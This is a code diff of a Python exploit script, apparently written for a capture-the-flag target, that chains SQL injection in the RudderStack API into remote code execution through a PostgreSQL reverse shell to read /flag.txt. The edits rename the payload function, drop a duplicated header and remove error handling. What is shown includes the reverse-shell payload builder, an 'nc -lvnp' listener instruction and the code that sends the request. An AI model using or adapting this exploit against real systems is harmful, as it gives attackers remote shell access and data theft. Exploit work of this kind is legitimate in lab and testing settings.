@@ -1,14 +1,8 @@
-"""
-Author: Aleksa Zaztezalo
-Date: May 2025
-Description: SQLi to RCE in Rudderstack. It get's the flag from /flag.txt.
-"""
-
 #!/usr/bin/env python3
 """
 Author: Aleksa Zaztezalo
 Date: May 2025
-Description: SQLi to RCE in Rudderstack. It gets the flag from /flag.txt.
+Description: SQLi to RCE in Rudderstack. It get's the flag from /flag.txt.
 """
 
 import requests
@@ -21,7 +15,7 @@ import argparse
 # Suppress insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def send_postgres_revshell(lhost, lport):
+def postgres_revshell(lhost, lport):
     """
     Creates a PostgreSQL reverse shell SQLi payload for the RudderStack API
     
@@ -205,33 +199,26 @@ def main():
     args = parser.parse_args()
     
     # Create the SQL injection payload
-    source_id = send_postgres_revshell(args.lhost, args.lport)
+    source_id = postgres_revshell(args.lhost, args.lport)
     
     print(f"[*] Setting up reverse shell to {args.lhost}:{args.lport}")
     print(f"[*] Make sure you have a listener running with: nc -lvnp {args.lport}")
     
-    try:
-        # Send the request
-        print(f"[*] Sending request to {args.url}")
-        if args.proxy:
-            print(f"[*] Using proxy: {args.proxy}")
+
+    # Send the request
+    print(f"[*] Sending request to {args.url}")
+    if args.proxy:
+        print(f"[*] Using proxy: {args.proxy}")
+    print(f"[*] Check your listener!")
+    response = send_rudderstack_request(
+        args.url,
+        source_id,
+        proxy_url=args.proxy,
+        task_run_id=args.task_id,
+        direct_fallback=not args.no_fallback,
+        debug=args.debug
+    )
         
-        response = send_rudderstack_request(
-            args.url,
-            source_id,
-            proxy_url=args.proxy,
-            task_run_id=args.task_id,
-            direct_fallback=not args.no_fallback,
-            debug=args.debug
-        )
-        
-        print("[*] Request sent successfully")
-        print("[*] If the target is vulnerable, you should receive a reverse shell connection")
-        print("[*] Check your listener!")
-        
-    except Exception as e:
-        print(f"[!] Fatal error: {str(e)}")
-        sys.exit(1)
 
 if __name__ == "__main__":
     main()
